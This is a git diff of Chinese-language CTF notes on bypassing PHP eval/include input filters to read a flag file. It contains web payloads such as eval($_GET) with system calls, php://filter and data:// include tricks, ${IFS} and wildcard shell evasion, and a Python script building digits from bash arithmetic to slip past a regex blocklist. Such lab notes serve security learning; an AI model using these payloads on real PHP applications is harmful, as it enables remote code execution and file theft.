@@ -117,7 +117,7 @@ c=eval($_GET[a]);&a=system('cat flag.php');//传入两个参数，c用于绕过�
 c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php 
 c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
 ```
-还有更高手！<br>
+
 **到这后，主要是发现 include($c)时的绕过办法**<br>
 ```php
 //data:// 这是一个数据URI方案的一部分。数据URI方案允许将小片段的数据直接嵌入到网页中，而不需要外部资源的引用
@@ -128,7 +128,7 @@ c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag
 c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=
 c=data://text/plain,<?php system("tac fl*g.php")?>
 ```
-当然,还有通过`|`符号或来得到我们想要的可见字符：**这个办法用来解决eval("echo($c);");**<br>
+**还有通过`|`符号或来得到我们想要的可见字符：这个办法用来解决eval("echo($c);");**<br>
 ```python
 import re
 import urllib
@@ -186,4 +186,16 @@ c=nl${IFS}fla''g.php%0a
 c=c''at${IFS}fla''g.p''hp
 c=/bin/ca?${IFS}f?ag.php //ca?匹配不到命令，需要全路径
 c=/???/????64 ????.??? // /bin/base64 flag.php
+```
+
+**新问题：遇到要求比较严格的```preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i"，$c）```但是还想输入数字，应该怎么办** <br>
+```python
+# $(())表示一次计算，0
+# $(( ~$(()) )) ：对0作取反运算，值为-1
+# $(( $((~$(()))) $((~$(()))) )) 表示-1-1 即 -2
+
+get_reverse_number = "$((~$(({}))))" # 取反操作
+negative_one = "$((~$(())))"		# -1
+payload = get_reverse_number.format(negative_one*37)
+print(payload)
 ```
